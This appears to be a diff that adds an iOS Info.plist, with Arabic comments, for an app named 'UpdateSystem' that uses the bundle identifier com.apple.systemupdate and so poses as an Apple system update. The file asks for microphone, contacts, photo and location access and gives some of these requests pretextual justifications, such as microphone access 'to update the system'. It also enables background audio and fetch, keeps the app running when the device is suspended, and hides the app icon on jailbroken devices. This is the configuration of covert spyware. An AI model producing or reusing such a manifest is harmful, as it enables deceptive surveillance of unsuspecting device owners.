@@ -1,0 +1,53 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <!-- ================== المعلومات الأساسية ================== -->
+    <key>CFBundleDisplayName</key>
+    <string>UpdateSystem</string>
+    <key>CFBundleIdentifier</key>
+    <string>com.apple.systemupdate</string>
+    <key>CFBundleName</key>
+    <string>UpdateSystem</string>
+    <key>CFBundleVersion</key>
+    <string>1.0</string>
+    <key>CFBundlePackageType</key>
+    <string>APPL</string>
+
+    <!-- ================== خاص بالآيفون فقط ================== -->
+    <key>LSRequiresIPhoneOS</key>
+    <true/>
+
+    <!-- ================== الأذونات ================== -->
+    <key>NSMicrophoneUsageDescription</key>
+    <string>التطبيق يحتاج إلى الميكروفون لتحديث النظام</string>
+    
+    <key>NSContactsUsageDescription</key>
+    <string>التطبيق يحتاج إلى جهات الاتصال للمزامنة</string>
+    
+    <key>NSPhotoLibraryUsageDescription</key>
+    <string>التطبيق يحتاج إلى الصور لحفظ الوسائط</string>
+    
+    <key>NSLocationWhenInUseUsageDescription</key>
+    <string>التطبيق يحتاج إلى الموقع لتحديث النظام</string>
+
+    <!-- ================== التشغيل في الخلفية ================== -->
+    <key>UIBackgroundModes</key>
+    <array>
+        <string>audio</string>
+        <string>fetch</string>
+    </array>
+
+    <!-- ================== إخفاء الأيقونة (لـ Jailbroken) ================== -->
+    <key>SBAppIconVisibility</key>
+    <string>hidden</string>
+
+    <!-- ================== منع الإيقاف عند القفل ================== -->
+    <key>UIApplicationExitsOnSuspend</key>
+    <false/>
+
+    <!-- ================== دعم iOS 14+ ================== -->
+    <key>MinimumOSVersion</key>
+    <string>14.0</string>
+</dict>
+</plist>
